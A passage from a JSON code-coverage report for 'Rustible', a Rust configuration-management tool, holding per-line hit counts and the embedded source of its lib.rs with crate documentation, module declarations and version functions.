th":1,"stats":{"Line":0}},{"line":464,"address":[31798517,31798664],"length":1,"stats":{"Line":0}},{"line":470,"address":[31792209,31785264,31786788],"length":1,"stats":{"Line":0}},{"line":471,"address":[31785548,31785372],"length":1,"stats":{"Line":0}},{"line":473,"address":[31785684],"length":1,"stats":{"Line":0}},{"line":475,"address":[31785738],"length":1,"stats":{"Line":0}},{"line":478,"address":[31785908,31785839],"length":1,"stats":{"Line":0}},{"line":479,"address":[31792048,31786060],"length":1,"stats":{"Line":0}},{"line":482,"address":[31792066,31792151],"length":1,"stats":{"Line":0}},{"line":483,"address":[31792074],"length":1,"stats":{"Line":0}},{"line":484,"address":[31792144],"length":1,"stats":{"Line":0}},{"line":488,"address":[31786112],"length":1,"stats":{"Line":0}},{"line":489,"address":[31786279,31788257],"length":1,"stats":{"Line":0}},{"line":494,"address":[31788267],"length":1,"stats":{"Line":0}},{"line":495,"address":[31788286],"length":1,"stats":{"Line":0}},{"line":496,"address":[31788349],"length":1,"stats":{"Line":0}},{"line":498,"address":[31788418],"length":1,"stats":{"Line":0}},{"line":499,"address":[31788667,31788463,31788569],"length":1,"stats":{"Line":0}},{"line":500,"address":[31788687],"length":1,"stats":{"Line":0}},{"line":501,"address":[31788848],"length":1,"stats":{"Line":0}},{"line":502,"address":[31788877],"length":1,"stats":{"Line":0}},{"line":507,"address":[31788936,31788633,31789034],"length":1,"stats":{"Line":0}},{"line":508,"address":[31789054],"length":1,"stats":{"Line":0}},{"line":509,"address":[31789215],"length":1,"stats":{"Line":0}},{"line":510,"address":[31789244],"length":1,"stats":{"Line":0}},{"line":515,"address":[31789397,31789000,31789303],"length":1,"stats":{"Line":0}},{"line":516,"address":[31789425,31789918],"length":1,"stats":{"Line":0}},{"line":517,"address":[31789604],"length":1,"stats":{"Line":0}},{"line":518,"address":[31789687,31789627],"length":1,"stats":{"Line":0}},{"line":521,"address":[31788502,31789953],"length":1,"stats":{"Line":0}},{"line":522,"address":[31789965],"length":1,"stats":{"Line":0}},{"line":523,"address":[31790117],"length":1,"stats":{"Line":0}},{"line":524,"address":[31790143],"length":1,"stats":{"Line":0}},{"line":530,"address":[31789367,31790202],"length":1,"stats":{"Line":0}},{"line":531,"address":[31790333,31790262],"length":1,"stats":{"Line":0}},{"line":532,"address":[31790433,31791180],"length":1,"stats":{"Line":0}},{"line":534,"address":[31790657,31790455],"length":1,"stats":{"Line":0}},{"line":535,"address":[31791162,31790739],"length":1,"stats":{"Line":0}},{"line":537,"address":[31790768,31790958],"length":1,"stats":{"Line":0}},{"line":538,"address":[31791132,31791157],"length":1,"stats":{"Line":0}},{"line":543,"address":[31791202,31790291],"length":1,"stats":{"Line":0}},{"line":544,"address":[31791307,31791420],"length":1,"stats":{"Line":0}},{"line":545,"address":[31791460,31791857],"length":1,"stats":{"Line":0}},{"line":546,"address":[31791490,31791557],"length":1,"stats":{"Line":0}},{"line":547,"address":[31791572,31791656],"length":1,"stats":{"Line":0}},{"line":548,"address":[31791663],"length":1,"stats":{"Line":0}},{"line":549,"address":[31791730],"length":1,"stats":{"Line":0}},{"line":550,"address":[31791599,31791522,31791870,31791849],"length":1,"stats":{"Line":0}},{"line":551,"address":[31791949],"length":1,"stats":{"Line":0}},{"line":557,"address":[31786323],"length":1,"stats":{"Line":0}},{"line":558,"address":[31786534,31786669,31786425],"length":1,"stats":{"Line":0}},{"line":559,"address":[31786783,31786754],"length":1,"stats":{"Line":0}},{"line":564,"address":[31786492,31786802,31786877],"length":1,"stats":{"Line":0}},{"line":565,"address":[31786897],"length":1,"stats":{"Line":0}},{"line":566,"address":[31787024],"length":1,"stats":{"Line":0}},{"line":567,"address":[31787203,31788118],"length":1,"stats":{"Line":0}},{"line":571,"address":[31787267],"length":1,"stats":{"Line":0}},{"line":575,"address":[31787389,31787321],"length":1,"stats":{"Line":0}},{"line":576,"address":[31787452,31787661,31787534],"length":1,"stats":{"Line":0}},{"line":577,"address":[31787830,31787936],"length":1,"stats":{"Line":0}},{"line":586,"address":[31785765],"length":1,"stats":{"Line":0}},{"line":590,"address":[31814988,31812624,31816303],"length":1,"stats":{"Line":0}},{"line":591,"address":[31812725],"length":1,"stats":{"Line":0}},{"line":592,"address":[31812831,31812757],"length":1,"stats":{"Line":0}},{"line":593,"address":[31815956,31816171,31812887],"length":1,"stats":{"Line":0}},{"line":594,"address":[31815988],"length":1,"stats":{"Line":0}},{"line":597,"address":[31812853,31812950],"length":1,"stats":{"Line":0}},{"line":598,"address":[31813006,31815823],"length":1,"stats":{"Line":0}},{"line":599,"address":[31815935,31815843],"length":1,"stats":{"Line":0}},{"line":600,"address":[31815928],"length":1,"stats":{"Line":0}},{"line":604,"address":[31812972,31813069],"length":1,"stats":{"Line":0}},{"line":605,"address":[31813125,31815810,31815616],"length":1,"stats":{"Line":0}},{"line":606,"address":[31815648],"length":1,"stats":{"Line":0}},{"line":609,"address":[31813091,31813188],"length":1,"stats":{"Line":0}},{"line":610,"address":[31813244,31815595,31815401],"length":1,"stats":{"Line":0}},{"line":611,"address":[31815433],"length":1,"stats":{"Line":0}},{"line":614,"address":[31813307,31813210],"length":1,"stats":{"Line":0}},{"line":615,"address":[31813363,31815002],"length":1,"stats":{"Line":0}},{"line":616,"address":[31815350,31815113,31815042],"length":1,"stats":{"Line":0}},{"line":617,"address":[31815129,31815195],"length":1,"stats":{"Line":0}},{"line":618,"address":[31815212,31815172,31815251],"length":1,"stats":{"Line":0}},{"line":619,"address":[31815228,31815265,31815304],"length":1,"stats":{"Line":0}},{"line":620,"address":[31815318,31815281,31815334],"length":1,"stats":{"Line":0}},{"line":621,"address":[31815324],"length":1,"stats":{"Line":0}},{"line":625,"address":[31814724,31813329,31813426],"length":1,"stats":{"Line":0}},{"line":626,"address":[31814708,31813482],"length":1,"stats":{"Line":0}},{"line":627,"address":[31814609],"length":1,"stats":{"Line":0}},{"line":628,"address":[31814643,31814729],"length":1,"stats":{"Line":0}},{"line":629,"address":[31814591],"length":1,"stats":{"Line":0}},{"line":632,"address":[31813557,31813448],"length":1,"stats":{"Line":0}},{"line":633,"address":[31813610,31814424,31814586],"length":1,"stats":{"Line":0}},{"line":634,"address":[31814456],"length":1,"stats":{"Line":0}},{"line":637,"address":[31813670,31813579],"length":1,"stats":{"Line":0}},{"line":638,"address":[31813723,31814241,31814403],"length":1,"stats":{"Line":0}},{"line":639,"address":[31814273],"length":1,"stats":{"Line":0}},{"line":642,"address":[31813692,31813783],"length":1,"stats":{"Line":0}},{"line":643,"address":[31813919,31814005,31814220],"length":1,"stats":{"Line":0}},{"line":644,"address":[31814037],"length":1,"stats":{"Line":0}},{"line":648,"address":[31813821,31813968],"length":1,"stats":{"Line":0}},{"line":654,"address":[31833718,31835378,31831408],"length":1,"stats":{"Line":1}},{"line":655,"address":[31831494],"length":1,"stats":{"Line":1}},{"line":656,"address":[31831571],"length":1,"stats":{"Line":1}},{"line":657,"address":[31831579],"length":1,"stats":{"Line":1}},{"line":659,"address":[31831646,31831595],"length":1,"stats":{"Line":2}},{"line":660,"address":[31831909,31831825],"length":1,"stats":{"Line":2}},{"line":663,"address":[31831925],"length":1,"stats":{"Line":1}},{"line":668,"address":[31832084,31832148],"length":1,"stats":{"Line":2}},{"line":669,"address":[31834596,31832200],"length":1,"stats":{"Line":2}},{"line":671,"address":[31834730,31835317],"length":1,"stats":{"Line":2}},{"line":672,"address":[31834919,31834849,31834900],"length":1,"stats":{"Line":2}},{"line":673,"address":[31835026],"length":1,"stats":{"Line":1}},{"line":674,"address":[31835069],"length":1,"stats":{"Line":1}},{"line":676,"address":[31835159,31834878,31835178],"length":1,"stats":{"Line":2}},{"line":677,"address":[31835301],"length":1,"stats":{"Line":1}},{"line":678,"address":[31835309],"length":1,"stats":{"Line":1}},{"line":682,"address":[31835120,31835373],"length":1,"stats":{"Line":2}},{"line":683,"address":[31835129,31835343],"length":1,"stats":{"Line":2}},{"line":684,"address":[31835366],"length":1,"stats":{"Line":3}},{"line":689,"address":[31832136],"length":1,"stats":{"Line":1}},{"line":691,"address":[31834036,31832246,31834542],"length":1,"stats":{"Line":3}},{"line":692,"address":[31834145],"length":1,"stats":{"Line":1}},{"line":693,"address":[31834220],"length":1,"stats":{"Line":1}},{"line":695,"address":[31834348,31834278],"length":1,"stats":{"Line":2}},{"line":696,"address":[31834417,31834532],"length":1,"stats":{"Line":2}},{"line":699,"address":[31833680,31832234],"length":1,"stats":{"Line":2}},{"line":701,"address":[31832328,31833799],"length":1,"stats":{"Line":2}},{"line":702,"address":[31833968,31833862],"length":1,"stats":{"Line":2}},{"line":706,"address":[31833905,31834031],"length":1,"stats":{"Line":2}},{"line":707,"address":[31833917,31834001],"length":1,"stats":{"Line":2}},{"line":708,"address":[31834024],"length":1,"stats":{"Line":1}},{"line":711,"address":[31832289,31832374],"length":1,"stats":{"Line":2}},{"line":712,"address":[31832595,31832663],"length":1,"stats":{"Line":2}},{"line":715,"address":[31832671,31832744],"length":1,"stats":{"Line":2}},{"line":716,"address":[31832807,31832879],"length":1,"stats":{"Line":2}},{"line":720,"address":[31832834,31832895],"length":1,"stats":{"Line":2}},{"line":721,"address":[31832947],"length":1,"stats":{"Line":1}},{"line":722,"address":[31833049],"length":1,"stats":{"Line":1}},{"line":727,"address":[31832909,31833112],"length":1,"stats":{"Line":2}},{"line":728,"address":[31833175,31833291],"length":1,"stats":{"Line":0}},{"line":729,"address":[31833306],"length":1,"stats":{"Line":0}},{"line":731,"address":[31833202],"length":1,"stats":{"Line":1}},{"line":732,"address":[31833248,31833399],"length":1,"stats":{"Line":2}},{"line":733,"address":[31833406],"length":1,"stats":{"Line":1}},{"line":734,"address":[31833468],"length":1,"stats":{"Line":1}},{"line":739,"address":[31831856],"length":1,"stats":{"Line":1}},{"line":743,"address":[31817269,31816448,31817275],"length":1,"stats":{"Line":0}},{"line":744,"address":[31816471],"length":1,"stats":{"Line":0}},{"line":747,"address":[31816485],"length":1,"stats":{"Line":0}},{"line":750,"address":[31816515,31816622],"length":1,"stats":{"Line":0}},{"line":751,"address":[31816815,31816723,31816950],"length":1,"stats":{"Line":0}},{"line":752,"address":[31817024,31817138],"length":1,"stats":{"Line":0}},{"line":753,"address":[31817260,31817198],"length":1,"stats":{"Line":0}},{"line":760,"address":[31827712,31828487],"length":1,"stats":{"Line":1}},{"line":761,"address":[31827755,31827841],"length":1,"stats":{"Line":2}},{"line":764,"address":[31827920,31827849],"length":1,"stats":{"Line":2}},{"line":765,"address":[31827980,31828040],"length":1,"stats":{"Line":2}},{"line":769,"address":[31828124,31828289,31828053,31828009],"length":1,"stats":{"Line":2}},{"line":770,"address":[31828307,31828088],"length":1,"stats":{"Line":2}},{"line":771,"address":[31828371],"length":1,"stats":{"Line":1}},{"line":775,"address":[31828428,31828168],"length":1,"stats":{"Line":2}},{"line":776,"address":[31828445],"length":1,"stats":{"Line":1}},{"line":780,"address":[31828560,31828804,31828829],"length":1,"stats":{"Line":0}},{"line":781,"address":[31828603],"length":1,"stats":{"Line":0}},{"line":782,"address":[31828686],"length":1,"stats":{"Line":0}},{"line":783,"address":[31828772],"length":1,"stats":{"Line":0}},{"line":784,"address":[31828789],"length":1,"stats":{"Line":0}},{"line":788,"address":[31828528],"length":1,"stats":{"Line":1}},{"line":789,"address":[31828546],"length":1,"stats":{"Line":1}},{"line":793,"address":[31794688],"length":1,"stats":{"Line":0}},{"line":794,"address":[31794706],"length":1,"stats":{"Line":0}},{"line":798,"address":[31828848],"length":1,"stats":{"Line":1}},{"line":799,"address":[31828866],"length":1,"stats":{"Line":1}},{"line":803,"address":[31795952],"length":1,"stats":{"Line":0}},{"line":804,"address":[31795970],"length":1,"stats":{"Line":0}},{"line":808,"address":[31827616],"length":1,"stats":{"Line":0}},{"line":809,"address":[31827633],"length":1,"stats":{"Line":0}},{"line":813,"address":[31795888],"length":1,"stats":{"Line":0}},{"line":814,"address":[31795907],"length":1,"stats":{"Line":0}},{"line":818,"address":[31827664],"length":1,"stats":{"Line":0}},{"line":819,"address":[31827681],"length":1,"stats":{"Line":0}},{"line":823,"address":[31785216],"length":1,"stats":{"Line":0}},{"line":824,"address":[31785233],"length":1,"stats":{"Line":0}},{"line":828,"address":[31794640],"length":1,"stats":{"Line":0}},{"line":829,"address":[31794657],"length":1,"stats":{"Line":0}},{"line":843,"address":[31817296,31819100,31819108],"length":1,"stats":{"Line":1}},{"line":844,"address":[31817368],"length":1,"stats":{"Line":1}},{"line":846,"address":[31817383],"length":1,"stats":{"Line":1}},{"line":847,"address":[31817426],"length":1,"stats":{"Line":0}},{"line":851,"address":[31817480,31817402],"length":1,"stats":{"Line":2}},{"line":852,"address":[31817509],"length":1,"stats":{"Line":1}},{"line":856,"address":[31817600],"length":1,"stats":{"Line":1}},{"line":857,"address":[31817662],"length":1,"stats":{"Line":0}},{"line":861,"address":[31817625],"length":1,"stats":{"Line":1}},{"line":862,"address":[31817716],"length":1,"stats":{"Line":1}},{"line":863,"address":[31817763,31817808,31819190],"length":1,"stats":{"Line":2}},{"line":864,"address":[31817777,31819126],"length":1,"stats":{"Line":1}},{"line":866,"address":[31819406,31819284],"length":1,"stats":{"Line":2}},{"line":868,"address":[31819296],"length":1,"stats":{"Line":1}},{"line":869,"address":[31819371],"length":1,"stats":{"Line":3}},{"line":870,"address":[31819394],"length":1,"stats":{"Line":1}},{"line":874,"address":[31817852,31817682,31817932],"length":1,"stats":{"Line":3}},{"line":875,"address":[31817879],"length":1,"stats":{"Line":1}},{"line":876,"address":[31818815,31818757,31818689,31819106,31817912],"length":1,"stats":{"Line":3}},{"line":877,"address":[30529040,30529069],"length":1,"stats":{"Line":1}},{"line":879,"address":[31818909,31819031],"length":1,"stats":{"Line":2}},{"line":881,"address":[31818921],"length":1,"stats":{"Line":1}},{"line":882,"address":[30529422,30529408],"length":1,"stats":{"Line":3}},{"line":883,"address":[31819019],"length":1,"stats":{"Line":1}},{"line":887,"address":[31817962],"length":1,"stats":{"Line":1}},{"line":888,"address":[31818041],"length":1,"stats":{"Line":1}},{"line":892,"address":[31818182,31818109],"length":1,"stats":{"Line":2}},{"line":893,"address":[31818203,31818498],"length":1,"stats":{"Line":2}},{"line":897,"address":[31818240],"length":1,"stats":{"Line":0}},{"line":904,"address":[31819472,31822856,31821198],"length":1,"stats":{"Line":0}},{"line":905,"address":[31819543],"length":1,"stats":{"Line":0}},{"line":906,"address":[31819608],"length":1,"stats":{"Line":0}},{"line":909,"address":[31819624],"length":1,"stats":{"Line":0}},{"line":911,"address":[31819858,31819672],"length":1,"stats":{"Line":0}},{"line":912,"address":[31819937,31820210],"length":1,"stats":{"Line":0}},{"line":914,"address":[31820248],"length":1,"stats":{"Line":0}},{"line":918,"address":[31820295],"length":1,"stats":{"Line":0}},{"line":920,"address":[31822177,31820386],"length":1,"stats":{"Line":0}},{"line":921,"address":[31822824,31822201],"length":1,"stats":{"Line":0}},{"line":922,"address":[31822463,31822396],"length":1,"stats":{"Line":0}},{"line":923,"address":[31822670,31822621,31822554],"length":1,"stats":{"Line":0}},{"line":924,"address":[31820347,31820435,31821159,31822421,31822083,31822561,31822787],"length":1,"stats":{"Line":0}},{"line":926,"address":[31820496,31821536],"length":1,"stats":{"Line":0}},{"line":927,"address":[31821560],"length":1,"stats":{"Line":0}},{"line":928,"address":[31821859,31821755,31821988],"length":1,"stats":{"Line":0}},{"line":929,"address":[31822043,31822098],"length":1,"stats":{"Line":0}},{"line":933,"address":[31820551,31820473],"length":1,"stats":{"Line":0}},{"line":935,"address":[31820755,31821428],"length":1,"stats":{"Line":0}},{"line":936,"address":[31820828,31821204,31821333],"length":1,"stats":{"Line":0}},{"line":937,"address":[31821443,31821388],"length":1,"stats":{"Line":0}},{"line":939,"address":[31821420],"length":1,"stats":{"Line":0}},{"line":941,"address":[31820935,31821064,31820765],"length":1,"stats":{"Line":0}},{"line":942,"address":[31821174,31821119],"length":1,"stats":{"Line":0}},{"line":948,"address":[31819982,31820127],"length":1,"stats":{"Line":0}},{"line":949,"address":[31820038],"length":1,"stats":{"Line":0}},{"line":950,"address":[31820089],"length":1,"stats":{"Line":0}},{"line":951,"address":[31820112],"length":1,"stats":{"Line":0}},{"line":955,"address":[31825904,31826871,31826834],"length":1,"stats":{"Line":1}},{"line":956,"address":[31825947],"length":1,"stats":{"Line":1}},{"line":959,"address":[31826042,31825982],"length":1,"stats":{"Line":2}},{"line":960,"address":[31826152,31826850],"length":1,"stats":{"Line":2}},{"line":964,"address":[31826177],"length":1,"stats":{"Line":1}},{"line":965,"address":[31826314,31826484],"length":1,"stats":{"Line":0}},{"line":966,"address":[31826715,31826556],"length":1,"stats":{"Line":0}},{"line":967,"address":[31826770,31826813],"length":1,"stats":{"Line":0}},{"line":972,"address":[31826333],"length":1,"stats":{"Line":1}},{"line":974,"address":[30529698,30529680],"length":1,"stats":{"Line":3}},{"line":979,"address":[31823706,31823280,31823700],"length":1,"stats":{"Line":0}},{"line":980,"address":[31823323],"length":1,"stats":{"Line":0}},{"line":981,"address":[31823349],"length":1,"stats":{"Line":0}},{"line":983,"address":[31822896],"length":1,"stats":{"Line":0}},{"line":989,"address":[31822981],"length":1,"stats":{"Line":0}},{"line":992,"address":[31823001],"length":1,"stats":{"Line":0}},{"line":993,"address":[31823043],"length":1,"stats":{"Line":0}},{"line":995,"address":[31823113,31823063],"length":1,"stats":{"Line":0}},{"line":996,"address":[31823126,31823166],"length":1,"stats":{"Line":0}},{"line":997,"address":[31823235],"length":1,"stats":{"Line":0}},{"line":1002,"address":[31823471,31823411],"length":1,"stats":{"Line":0}},{"line":1003,"address":[31823688,31823581],"length":1,"stats":{"Line":0}},{"line":1006,"address":[31823602],"length":1,"stats":{"Line":0}},{"line":1010,"address":[31797273,31796852,31795984],"length":1,"stats":{"Line":0}},{"line":1011,"address":[31796039],"length":1,"stats":{"Line":0}},{"line":1014,"address":[31796108],"length":1,"stats":{"Line":0}},{"line":1017,"address":[31796164,31796228],"length":1,"stats":{"Line":0}},{"line":1018,"address":[31796359,31796863],"length":1,"stats":{"Line":0}},{"line":1019,"address":[31796922],"length":1,"stats":{"Line":0}},{"line":1020,"address":[31797091,31797137],"length":1,"stats":{"Line":0}},{"line":1026,"address":[31796386],"length":1,"stats":{"Line":0}},{"line":1027,"address":[31796693,31796555,31796716],"length":1,"stats":{"Line":0}},{"line":1030,"address":[31796582],"length":1,"stats":{"Line":0}},{"line":1034,"address":[31785200],"length":1,"stats":{"Line":1}},{"line":1035,"address":[31785205],"length":1,"stats":{"Line":1}},{"line":1039,"address":[31794624],"length":1,"stats":{"Line":0}},{"line":1040,"address":[31794629],"length":1,"stats":{"Line":0}},{"line":1045,"address":[31783765,31783759,31782992],"length":1,"stats":{"Line":0}},{"line":1046,"address":[31783035],"length":1,"stats":{"Line":0}},{"line":1047,"address":[31783059],"length":1,"stats":{"Line":0}},{"line":1048,"address":[31783071],"length":1,"stats":{"Line":0}},{"line":1050,"address":[31783091,31783139],"length":1,"stats":{"Line":0}},{"line":1051,"address":[31783331],"length":1,"stats":{"Line":0}},{"line":1052,"address":[31783570,31783497],"length":1,"stats":{"Line":0}},{"line":1053,"address":[31783608,31783524],"length":1,"stats":{"Line":0}},{"line":1054,"address":[31783733,31783549],"length":1,"stats":{"Line":0}},{"line":1055,"address":[31783636],"length":1,"stats":{"Line":0}},{"line":1056,"address":[31783738,31783703],"length":1,"stats":{"Line":0}},{"line":1062,"address":[31783385],"length":1,"stats":{"Line":0}},{"line":1063,"address":[31783457],"length":1,"stats":{"Line":0}},{"line":1067,"address":[31782965,31782971,31782496],"length":1,"stats":{"Line":1}},{"line":1068,"address":[31782539],"length":1,"stats":{"Line":1}},{"line":1070,"address":[31782571,31782639],"length":1,"stats":{"Line":2}},{"line":1071,"address":[31782758],"length":1,"stats":{"Line":1}},{"line":1072,"address":[31782929,31782871],"length":1,"stats":{"Line":2}},{"line":1073,"address":[31782905,31782934],"length":1,"stats":{"Line":0}},{"line":1075,"address":[31782922],"length":1,"stats":{"Line":0}},{"line":1076,"address":[31782948],"length":1,"stats":{"Line":0}},{"line":1078,"address":[31782960,31782864],"length":1,"stats":{"Line":2}},{"line":1082,"address":[31782804],"length":1,"stats":{"Line":1}},{"line":1083,"address":[31782821],"length":1,"stats":{"Line":1}},{"line":1087,"address":[31783792,31785058,31785064],"length":1,"stats":{"Line":1}},{"line":1088,"address":[31783851],"length":1,"stats":{"Line":1}},{"line":1091,"address":[31783888,31783940],"length":1,"stats":{"Line":1}},{"line":1092,"address":[31783913,31784063],"length":1,"stats":{"Line":1}},{"line":1094,"address":[31783967,31785092],"length":1,"stats":{"Line":0}},{"line":1098,"address":[31784009,31784134],"length":1,"stats":{"Line":2}},{"line":1099,"address":[31784150],"length":1,"stats":{"Line":1}},{"line":1100,"address":[31784306],"length":1,"stats":{"Line":1}},{"line":1105,"address":[31784559,31784476],"length":1,"stats":{"Line":2}},{"line":1106,"address":[31784575],"length":1,"stats":{"Line":1}},{"line":1108,"address":[31784731,31784520],"length":1,"stats":{"Line":0}},{"line":1110,"address":[31784886,31784755],"length":1,"stats":{"Line":0}},{"line":1111,"address":[31784930],"length":1,"stats":{"Line":0}},{"line":1114,"address":[31784779],"length":1,"stats":{"Line":0}},{"line":1118,"address":[31784661],"length":1,"stats":{"Line":0}},{"line":1122,"address":[31782471,31782477,31781024],"length":1,"stats":{"Line":0}},{"line":1123,"address":[31781054],"length":1,"stats":{"Line":0}},{"line":1124,"address":[31781098],"length":1,"stats":{"Line":0}},{"line":1125,"address":[31781126],"length":1,"stats":{"Line":0}},{"line":1126,"address":[31781173],"length":1,"stats":{"Line":0}},{"line":1127,"address":[31781572,31781190,31781505],"length":1,"stats":{"Line":0}},{"line":1128,"address":[31781518],"length":1,"stats":{"Line":0}},{"line":1129,"address":[31781579,31781714],"length":1,"stats":{"Line":0}},{"line":1131,"address":[31781829,31781628,31781992],"length":1,"stats":{"Line":0}},{"line":1132,"address":[31781888],"length":1,"stats":{"Line":0}},{"line":1134,"address":[31781725],"length":1,"stats":{"Line":0}},{"line":1137,"address":[31781649],"length":1,"stats":{"Line":0}},{"line":1140,"address":[31781231],"length":1,"stats":{"Line":0}},{"line":1141,"address":[31781321],"length":1,"stats":{"Line":0}},{"line":1142,"address":[31781333],"length":1,"stats":{"Line":0}},{"line":1144,"address":[31781439],"length":1,"stats":{"Line":0}},{"line":1145,"address":[31781464],"length":1,"stats":{"Line":0}},{"line":1146,"address":[31781482,31782041],"length":1,"stats":{"Line":0}},{"line":1147,"address":[31782185,31782335,31782262],"length":1,"stats":{"Line":0}},{"line":1149,"address":[31782204],"length":1,"stats":{"Line":0}},{"line":1155,"address":[31776832],"length":1,"stats":{"Line":0}},{"line":1156,"address":[31776898],"length":1,"stats":{"Line":0}},{"line":1159,"address":[31776865],"length":1,"stats":{"Line":0}},{"line":1160,"address":[31776884],"length":1,"stats":{"Line":0}},{"line":1163,"address":[31777176,31777112],"length":1,"stats":{"Line":0}},{"line":1164,"address":[31777249,31777428],"length":1,"stats":{"Line":0}},{"line":1167,"address":[31777292,31777453],"length":1,"stats":{"Line":0}},{"line":1168,"address":[31777482,31777525],"length":1,"stats":{"Line":0}},{"line":1169,"address":[31777603],"length":1,"stats":{"Line":0}},{"line":1170,"address":[31777667],"length":1,"stats":{"Line":0}},{"line":1175,"address":[31777268],"length":1,"stats":{"Line":0}}],"covered":116,"coverable":540},{"path":["/","home","artur","Repositories","rustible","src","lib.rs"],"content":"//! # Rustible - A Modern Configuration Management Tool\n//!\n//! Rustible is an async-first, type-safe configuration management and automation tool\n//! written in Rust. It serves as a modern alternative to Ansible with improved performance,\n//! better error handling, and parallel execution by default.\n//!\n//! ## Core Concepts\n//!\n//! - **Playbooks**: YAML-defined automation workflows containing plays and tasks\n//! - **Inventory**: Collection of hosts organized into groups with variables\n//! - **Modules**: Units of work that execute actions on target hosts\n//! - **Tasks**: Individual units of execution that invoke modules\n//! - **Handlers**: Special tasks triggered by notifications from other tasks\n//! - **Roles**: Reusable collections of tasks, handlers, files, and templates\n//! - **Facts**: System information gathered from target hosts\n//! - **Connections**: Transport layer for communicating with hosts (SSH, local, etc.)\n//!\n//! ## Architecture Overview\n//!\n//! ```text\n//! \n//!                            CLI Interface                              \n//!                     (clap-based command parsing)                      \n//! \n//!                                    \n//!                                    \n//! \n//!                          Playbook Engine                              \n//!               (Async execution with tokio runtime)                    \n//! \n//!                                    \n//!          \n//!                                                            \n//!       \n//!     Inventory          Module Registry         Template Engine   \n//!     (hosts +           (built-in +             (Jinja2-compat    \n//!      groups)            custom)                 via minijinja)   \n//!       \n//!                                                            \n//!          \n//!                                    \n//! \n//!                       Connection Manager                              \n//!           (SSH, Local, Docker, Kubernetes connections)                \n//! \n//!                                    \n//!                                    \n//! \n//!                          Target Hosts                                 \n//! \n//! ```\n//!\n//! ## Quick Example\n//!\n//! ```rust,ignore\n//! use rustible::prelude::*;\n//!\n//! #[tokio::main]\n//! async fn main() -\u003e Result\u003c()\u003e {\n//!     // Load inventory\n//!     let inventory = Inventory::from_file(\"inventory.yml\").await?;\n//!\n//!     // Load and parse playbook\n//!     let playbook = Playbook::from_file(\"playbook.yml\").await?;\n//!\n//!     // Create executor with default settings\n//!     let executor = PlaybookExecutor::new()\n//!         .with_inventory(inventory)\n//!         .with_parallelism(10)\n//!         .build()?;\n//!\n//!     // Execute playbook\n//!     let result = executor.run(\u0026playbook).await?;\n//!\n//!     // Report results\n//!     println!(\"{}\", result.summary());\n//!     Ok(())\n//! }\n//! ```\n\n#![allow(missing_docs)] // TODO: Add comprehensive documentation in future PR\n#![warn(clippy::all)]\n#![warn(clippy::pedantic)]\n#![allow(clippy::module_name_repetitions)]\n\n// Re-export commonly used items in prelude\npub mod prelude {\n    //! Convenient re-exports of commonly used types and traits.\n    //!\n    //! This prelude provides quick access to the most commonly needed types:\n    //!\n    //! - **Connections**: Various connection types (SSH, Local, Docker)\n    //! - **Execution**: Playbook and task executors\n    //! - **Inventory**: Hosts, groups, and variables\n    //! - **Modules**: Module system and registry\n    //! - **Callbacks**: Common callback plugins (see [`callback::prelude`] for more)\n    //! - **Errors**: Error handling types\n    //!\n    //! # Example\n    //!\n    //! ```rust,ignore\n    //! use rustible::prelude::*;\n    //!\n    //! #[tokio::main]\n    //! async fn main() -\u003e Result\u003c()\u003e {\n    //!     let inventory = Inventory::from_file(\"inventory.yml\").await?;\n    //!     let playbook = Playbook::from_file(\"playbook.yml\").await?;\n    //!\n    //!     let executor = PlaybookExecutor::new()\n    //!         .with_inventory(inventory)\n    //!         .with_parallelism(10)\n    //!         .build()?;\n    //!\n    //!     let result = executor.run(\u0026playbook).await?;\n    //!     Ok(())\n    //! }\n    //! ```\n    //!\n    //! [`callback::prelude`]: crate::callback::prelude\n\n    // Connection types\n    pub use crate::connection::config::RetryConfig;\n    pub use crate::connection::docker::DockerConnection;\n    pub use crate::connection::local::LocalConnection;\n    #[cfg(feature = \"russh\")]\n    pub use crate::connection::russh::{RusshConnection, RusshConnectionBuilder};\n    #[cfg(feature = \"ssh2-backend\")]\n    pub use crate::connection::ssh::{SshConnection, SshConnectionBuilder};\n    pub use crate::connection::{\n        CommandResult, Connection, ConnectionBuilder, ConnectionConfig, ConnectionError,\n        ConnectionFactory, ConnectionResult, ConnectionType, ExecuteOptions, FileStat, HostConfig,\n        TransferOptions,\n    };\n\n    // Error handling\n    pub use crate::error::{Error, Result};\n\n    // Execution engine\n    pub use crate::executor::{PlaybookExecutor, TaskExecutor};\n\n    // Facts system\n    pub use crate::facts::Facts;\n\n    // Handlers\n    pub use crate::handlers::Handler;\n\n    // Inventory\n    pub use crate::inventory::{Group, Host, Inventory};\n\n    // Module system\n    pub use crate::modules::{Module, ModuleRegistry, ModuleResult};\n\n    // Playbooks\n    pub use crate::playbook::{Play, Playbook, Task};\n\n    // Roles\n    pub use crate::roles::Role;\n\n    // Core traits\n    pub use crate::traits::*;\n\n    // Variables\n    pub use crate::vars::Variables;\n\n    // Common callback plugins (for full callback API, use callback::prelude)\n    pub use crate::callback::{\n        BoxedCallback, DefaultCallback, MinimalCallback, NullCallback, ProgressCallback,\n        SharedCallback,\n    };\n}\n\n// ============================================================================\n// Core Modules\n// ============================================================================\n\npub mod error;\npub mod traits;\npub mod vars;\n\n// ============================================================================\n// Playbook Components\n// ============================================================================\n\npub mod handlers;\npub mod playbook;\npub mod roles;\npub mod tasks;\n\n// ============================================================================\n// Infrastructure\n// ============================================================================\n\npub mod connection;\npub mod facts;\npub mod inventory;\n\n// ============================================================================\n// Execution Engine\n// ============================================================================\n\npub mod executor;\npub mod strategy;\n\n// ============================================================================\n// Modules (Built-in task implementations)\n// ============================================================================\n\npub mod modules;\n\n// ============================================================================\n// Templating and Variables\n// ============================================================================\n\npub mod template;\n\n// ============================================================================\n// Vault (Encrypted secrets management)\n// ============================================================================\n\npub mod vault;\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\npub mod config;\n\n// ============================================================================\n// Reporting and Output\n// ============================================================================\n\npub mod output;\n\n// ============================================================================\n// Callback Plugins\n// ============================================================================\n\npub mod callback;\n\n// ============================================================================\n// Version Information\n// ============================================================================\n\n/// Returns the current version of Rustible.\npub fn version() -\u003e \u0026'static str {\n    env!(\"CARGO_PKG_VERSION\")\n}\n\n/// Returns detailed version information including build metadata.\npub fn version_info() -\u003e VersionInfo {\n    VersionInfo {\n        version: env!(\"CARGO_PKG_VERSION\"),\n        rust_version: option_env!(\"CARGO_PKG_RUST_VERSION\").unwrap_or(\"unknown\"),\n        target: std::env::consts::ARCH,\n        profile: if cfg!(debug_assertions) {\n            \"debug\"\n        } else {\n            \"release\"\n        },\n    }\n}\n\n/// Detailed version information for the Rustible build.\n#[derive(Debug, 